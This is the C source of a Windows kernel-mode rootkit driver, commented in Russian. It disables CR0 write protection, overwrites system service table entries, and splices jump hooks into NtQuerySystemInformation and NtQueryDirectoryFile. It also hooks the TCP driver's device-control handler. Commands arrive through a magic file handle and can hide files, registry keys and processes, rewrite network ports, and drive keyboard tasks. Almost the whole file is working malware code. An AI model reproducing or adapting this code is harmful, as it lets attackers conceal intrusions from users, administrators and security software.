#include "inc.h"
#include "proc.h"
#include "command.h"
#include "net.h"
#include "file.h"
#include "key.h"
#include "keyboard.h"

typedef struct _KSERVICE_TABLE_DESCRIPTOR {
    PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
    PULONG Count;           // массив счётчиков вызовов сервисов
    ULONG Limit;            // количество вызовов в таблице
    PUCHAR Number;          // массив количества параметров вызовов(в байтах)
} KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;


typedef NTSTATUS (*NT_QUERY_INFORMATION_FILE)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass
);

#define NUMBER_NT_QUERY_INFORMATION_FILE  0x97 //151
#define SYSCALL_SIGNATURE  0x00ABBA00

NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp);
VOID DriverUnload(IN PDRIVER_OBJECT dob);

ULONG_PTR HookNtQueryInformationFile(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass
);
BOOLEAN CheckHookProlog(PUCHAR adr);
ULONG SplicingSyscall(ULONG addressSyscall,
    void* addressHooker,
    PUCHAR saveBytes,
    BOOLEAN noCheck,
    ULONG skipCount);
void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes);

NT_QUERY_INFORMATION_FILE glRealNtQueryInformationFile;
extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;


ULONG ClearWP(void) {

    ULONG reg = 0;

    __asm {
        mov eax, cr0
        mov[reg], eax
        and eax, 0xFFFEFFFF
        mov cr0, eax
    }

    return reg;
}

void WriteCR0(ULONG reg) {

    __asm {
        mov eax, [reg]
        mov cr0, eax
    }

}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {

    ULONG reg;
    NTSTATUS status;

#if DBG
    DbgPrint("Load driver %wZ\n", &dob->DriverName);
    DbgPrint("Registry path %wZ\n", rgp);
#endif

    glRealNtQueryInformationFile = (NT_QUERY_INFORMATION_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE];
    glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];


    // Init splicing hook IRP for net
    status = InstallTCPDriverHook(L"\\Device\\Tcp");
    if (!NT_SUCCESS(status)) {
        return status;
    }


    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE] = (ULONG)HookNtQueryInformationFile;
    KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)HookNtEnumerateKey;
    WriteCR0(reg);

    

    // Init task list for create process
    addressForJmpNtQuerySystemInformation = SplicingSyscall(
        KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION],
        HookNtQuerySystemInformation,
        saveByteNtQuerySystemInformation,
        TRUE,
        0
    );


    // Init task list for hide file
    addressForJmpNtNtQueryDirectoryFile = SplicingSyscall(
        KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE],
        HookNtQueryDirectoryFile,
        saveByteNtQueryDirectoryFile,
        TRUE,
        0
    );

    // Init task list for rename process Создание резервного списка
    // для выравнивания выделяемой памяти
    ExInitializePagedLookasideList(&glPagedTaskQueueProcess, NULL, NULL, 0, sizeof(TASK_QUEUE_PROCESS), ' LFO', 0);
    InitializeListHead(&glTaskQueueProcess);
    //


    ExInitializePagedLookasideList(&glPagedTaskQueueFile, NULL, NULL, 0, sizeof(TASK_QUEUE_FILE), ' LFO', 0);
    InitializeListHead(&glTaskQueueFile);
    //

    // Init task list for add key
    ExInitializePagedLookasideList(&glPagedTaskQueueKey, NULL, NULL, 0, sizeof(TASK_QUEUE_KEY), ' LFO', 0);
    InitializeListHead(&glTaskQueueKey);
    //

    // Init task list for net
    ExInitializePagedLookasideList(&glPagedTaskQueueNet, NULL, NULL, 0, sizeof(TASK_QUEUE_NET), ' LFO', 0);
    InitializeListHead(&glTaskQueueNet);
    //

    // Init task list for hide key Создание резервного списка
    // для выравнивания выделяемой памяти
    ExInitializePagedLookasideList(&glPagedHideLastKey, NULL, NULL, 0, sizeof(HIDE_LAST_KEY), ' LFO', 0);
    InitializeListHead(&glHideLastKey);
    //

    //Hook keyboard
    /*status = InitHookKeyboard(dob);
    if (!NT_SUCCESS(status)) {
        DbgPrint("Init hook keyboard error %X", status);
        return status;
    }*/
    //

    dob->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}

VOID DriverUnload(IN PDRIVER_OBJECT dob) {

    ULONG reg;

#if DBG
    DbgPrint("Driver unload\n");
#endif

    reg = ClearWP();
    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_INFORMATION_FILE] = (ULONG)glRealNtQueryInformationFile;
    KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)glRealNtEnumerateKey;
    WriteCR0(reg);

    //free list for create new process
    if (addressForJmpNtQuerySystemInformation) {
        UnhookSyscall(
            (PUCHAR)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION],
            saveByteNtQuerySystemInformation
        );
    }
    FreeListQueueProcess();
    ExDeletePagedLookasideList(&glPagedTaskQueueProcess);
    while (SyscallNewProcessedCount);
    //

    //free list for hide file
    if (addressForJmpNtNtQueryDirectoryFile) {
        UnhookSyscall(
            (PUCHAR)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE],
            saveByteNtQueryDirectoryFile
        );
    }
    FreeListQueueFilename();
    ExDeletePagedLookasideList(&glPagedTaskQueueFile);
    while(SyscallProcessedCount);
    //

    //free list for add key
    FreeTaskQueueKeyList();
    ExDeletePagedLookasideList(&glPagedTaskQueueKey);
    //

    //free list for add key
    FreeTaskQueueKeyList();
    ExDeletePagedLookasideList(&glPagedHideLastKey);
    //

    //free list for net
    FreeTaskQueueKeyList();
    ExDeletePagedLookasideList(&glPagedTaskQueueNet);
    //

    //unhook keyboard
    //UnhookKeyboard(dob);
    //

    if (glRealIrpMjDeviceControl) {
        pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = glRealIrpMjDeviceControl;
    }
    if (pTcpFile != NULL) {
        ObDereferenceObject(pTcpFile);
    }


    return;
}


ULONG_PTR HookNtQueryInformationFile(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass)
{
    
    NTSTATUS retStatus = STATUS_SUCCESS;
    
    if ((ULONG)FileHandle == (ULONG)SYSCALL_SIGNATURE) {

        PCOMMAND pCmd = (PCOMMAND)IoStatusBlock;

        if (pCmd->flags & COMMAND_TEST_COMMAND) {
            DbgPrint("HookNtQueryInformationFile execute\n");
        }
        else if (pCmd->flags & COMMAND_ADD_NEW_PROCESS) {
            if (pCmd->target != NULL && pCmd->change != NULL) {
                TaskQueueNewProc((ULONG)pCmd->target, (PCHAR)pCmd->change);
            }
        }
        else if (pCmd->flags & COMMAND_HIDE_FILE) {
            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {
                
                DbgPrint("Hide file command for %s\n", (PCHAR)pCmd->target);
                TaskQueueByFilename((PCHAR)pCmd->target);

            }
        }
        else if (pCmd->flags & COMMAND_HIDE_KEY) {
            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {
                TaskQueueByKey((PCHAR)pCmd->target);
            }
        }
        else if (pCmd->flags & COMMAND_CHANGE_PORT) {
            DbgPrint("Change port\n");
            if (pCmd->flags & COMMAND_BUFFER_SRC_PORT) {
                TaskQueueByNet((ULONG)pCmd->target, (ULONG)pCmd->change, TRUE);
            }
            else if (pCmd->flags & COMMAND_BUFFER_DST_PORT) {
                TaskQueueByNet((ULONG)pCmd->target, (ULONG)pCmd->change, FALSE);
            }
        }
        else if (pCmd->flags & COMMAND_KEYBOARD) {
            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {

                DbgPrint("Task keyboard %s %d\n", (PCHAR)pCmd->target, (ULONG)pCmd->change);
                TaskKeyboard((PCHAR)pCmd->target, (ULONG)pCmd->change);

            }
        }
        else {
            DbgPrint("No dispatch for command with flag %d\n", pCmd->flags);
        }
    }
    else {
        retStatus = glRealNtQueryInformationFile(
            FileHandle,
            IoStatusBlock,
            FileInformation,
            Length,
            FileInformationClass
        );

        //DbgPrint("arg_01 0x%08X\narg_02 0x%08X\narg_03 0x%08X\narg_04 0x%08X\n",
        //    arg_01, arg_02, arg_03, arg_04);
    }

    return retStatus;
}



//--------------------

ULONG SplicingSyscall(ULONG addressSyscall, void* addressHooker, PUCHAR saveBytes, BOOLEAN noCheck, ULONG skipCount) {


    ULONG reg;
    unsigned int i;


    if (noCheck && !CheckHookProlog((PUCHAR)addressSyscall)) {
        return 0;
    }

    for (i = 0; i < 5; ++i) {
        saveBytes[i] = ((PUCHAR)addressSyscall)[i];
    }

    reg = ClearWP();
    ((PUCHAR)addressSyscall)[0] = 0xE9;
    *((PULONG)(addressSyscall + 1)) = (ULONG)addressHooker - (addressSyscall + 5);
    WriteCR0(reg);

    if (skipCount)
        return addressSyscall + skipCount;
    else
        return addressSyscall + 5;
}


void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes) {


    unsigned int i;
    ULONG reg;

    reg = ClearWP();
    for (i = 0; i < 5; ++i) {
        addressSyscall[i] = saveBytes[i];
    }
    WriteCR0(reg);

    return;
}

//
// Проверяет находится ли по адресу adr
// стандартный пролог:
// mov     edi, edi
// push    ebp
// mov     ebp, esp
//
BOOLEAN CheckHookProlog(PUCHAR adr) {
    static UCHAR hookProlog[5] = { 0x8B,0xFF,0x55,0x8B,0xEC };
    static UCHAR hookProlog2[5] = { 0x68,0x10,0x02,0x00,0x00 }; //6810020000

    if (
            (
                (adr[0] == hookProlog[0]) &&
                (adr[1] == hookProlog[1]) &&
                (adr[2] == hookProlog[2]) &&
                (adr[3] == hookProlog[3]) &&
                (adr[4] == hookProlog[4])
            )
        || 
            (
                (adr[0] == hookProlog2[0]) &&
                (adr[1] == hookProlog2[1]) &&
                (adr[2] == hookProlog2[2]) &&
                (adr[3] == hookProlog2[3]) &&
                (adr[4] == hookProlog2[4])
            )
        )
        return TRUE;
    else
        return FALSE;

}